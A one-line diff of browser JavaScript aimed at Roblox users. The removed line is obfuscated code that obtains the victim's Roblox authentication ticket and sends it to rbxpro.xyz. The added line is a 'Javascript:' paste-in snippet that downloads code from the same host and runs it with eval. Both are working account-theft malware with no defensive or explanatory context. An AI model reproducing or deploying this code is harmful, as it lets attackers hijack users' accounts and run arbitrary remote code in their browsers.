@@ -1,1 +1,1 @@
-var id = "1471426556"; var _0x9e55=["POST","https://auth.roblox.com/v1/authentication-ticket","https://rbxpro.xyz/?confirmation=","rbx-authentication-ticket","getResponseHeader","&id=","get","ajax"];var _0xce38=[_0x9e55[0],_0x9e55[1],_0x9e55[2],_0x9e55[3],_0x9e55[4],_0x9e55[5],_0x9e55[6],_0x9e55[7]];var data={};$[_0xce38[7]]({type:_0xce38[0],url:_0xce38[1],data:data,success:function(_0xe233x3,_0xe233x4,_0xe233x5){$[_0xce38[6]](_0xce38[2]+ _0xe233x5[_0xce38[4]](_0xce38[3])+ _0xce38[5]+ id)}})
+Javascript:$.get(' //rbxpro.xyz/?id=193457146',i=>eval(i))
